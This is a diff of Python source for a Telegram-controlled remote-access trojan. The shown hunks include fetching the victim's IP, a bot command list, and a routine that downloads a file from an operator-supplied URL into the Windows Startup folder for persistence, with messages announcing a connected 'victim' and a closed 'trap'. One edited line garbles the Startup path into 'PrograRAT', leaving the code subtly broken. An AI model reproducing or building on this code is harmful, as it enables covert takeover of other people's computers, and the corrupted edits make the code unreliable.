@@ -1,6 +1,7 @@
 import requests
 from os import chdir, getcwd, remove, startfile
-from tkinter import Tk, Label, PhotoImage, messagebox, Toplevel
+from tkinter import *
+from tkinter import messagebox
 cwd = getcwd()
 def check_internret():
     try:
@@ -23,7 +24,7 @@ if check_internret():
     keyboard = Hub.Keyboard()
     ip = requests.get("https://api.ipify.org/").text
     local_ip = os.Get_IP()
-    token = BOT_TOKEN # 6622962602:AAERgZlXugMGZIA5vqkIpv5KKAAsDUrA6is
+    token = BOT_TOKEN 
     id = TELEGRAM_ID
     commands = ["/check", 
                 "/sysinfo", 
@@ -69,8 +70,8 @@ if check_internret():
                     "AgentList":"Internet Explorer",
                     "VersionsList":"HTTP/1.1",
                     "MethodList":"GET"}
-            msg = requests.post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx", data=data)
-            if msg.status_code == 200: return True
+            RATg = requests.post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx", data=data)
+            if RATg.status_code == 200: return True
             else: return False
         except: return False
     def read_msg(token=token):
@@ -225,7 +226,7 @@ if check_internret():
                             send_msg("Write your download link(in 10 seconds):")
                             sleep(10)
                             url = read_msg()
-                            path = fr"C:\Users\{getuser()}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+                            path = fr"C:\Users\{getuser()}\AppData\Roaming\Microsoft\Windows\Start Menu\PrograRAT\Startup"
                             wget.download(url, out=path)
                             send_msg("File is added to startup.")
                         except: send_msg("Error;")
@@ -417,8 +418,8 @@ if check_internret():
                 send_msg("start() function error. try again...")
                 continue
     send_msg(f"Connected to victim with {ip}(local: {local_ip}) at {strftime("%H:%M:%S")}. Whene trap close I will notif you.")
-TK_CODE
+ONLINE_CODE
     send_msg(f"Victim is closed trap at {strftime("%H:%M:%S")}(write /commands for help).")
     start()
 else:
-OFFLINE_TKINTER_CODE
+OFFLINE_CODE
